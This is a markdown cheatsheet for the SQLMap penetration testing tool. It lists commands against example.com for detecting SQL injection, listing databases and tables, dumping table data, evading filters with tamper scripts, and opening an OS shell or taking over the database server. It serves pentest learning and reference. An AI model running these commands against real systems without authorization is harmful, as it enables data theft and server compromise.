---
title: SQLMap
tags: 
 - sqlmap
 - cheatsheet
---

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. This cheatsheet provides a quick reference to essential SQLMap commands and usage scenarios.

## 1. Basic Usage

### 1.1 Detecting SQL Injection

```bash
sqlmap -u "http://example.com/page.php?id=1"
# Automatically tests for SQL injection vulnerabilities.
```

### 1.2 Specifying HTTP Method

```bash
sqlmap -u "http://example.com/form" --data="query=test" --method=POST
# Test a form with POST data.
```

## 2. Database Management System Specification

### 2.1 Specify DBMS

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql
# Specify the backend database management system (MySQL in this case).
```

### 2.2 Test All DBMS

```bash
sqlmap -u "http://example.com/page.php?id=1" --all
# Test all supported DBMSs.
```

## 3. Data Enumeration

### 3.1 Get Database Names

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
# List the names of available databases.
```

### 3.2 Get Tables in a Database

```bash
sqlmap -u "http://example.com/page.php?id=1" -D dbname --tables
# List the tables within a specified database.
```

### 3.3 Dump Table Data

```bash
sqlmap -u "http://example.com/page.php?id=1" -D dbname -T tablename --dump
# Dump the entries of a specified table from the database.
```

## 4. Advanced Techniques

### 4.1 Using Proxies

```bash
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
# Route traffic through a proxy.
```

### 4.2 Tampering Scripts

```bash
sqlmap -u "http://example.com/page.php?id=1" --tamper="space2comment"
# Use a tamper script to evade filters or WAFs.
```

### 4.3 OS Shell Interaction

```bash
sqlmap -u "http://example.com/page.php?id=1" --os-shell
# Attempt to open an OS shell on the database server.
```

### 4.4 Database Server Takeover

```bash
sqlmap -u "http://example.com/page.php?id=1" --os-pwn
# Automate the exploitation of a remote DBMS via out-of-band SQL injection.
```

## 5. Automating Requests

### 5.1 Batch Mode

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch
# Automatically accept defaults for all questions.
```

### 5.2 Saving Results

```bash
sqlmap -u "http://example.com/page.php?id=1" --output-dir=/path/to/output
# Save the output of SQLMap to a specified directory.
```

## 6. References

- [Official SQLMap Documentation](http://sqlmap.org/)
- [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap)
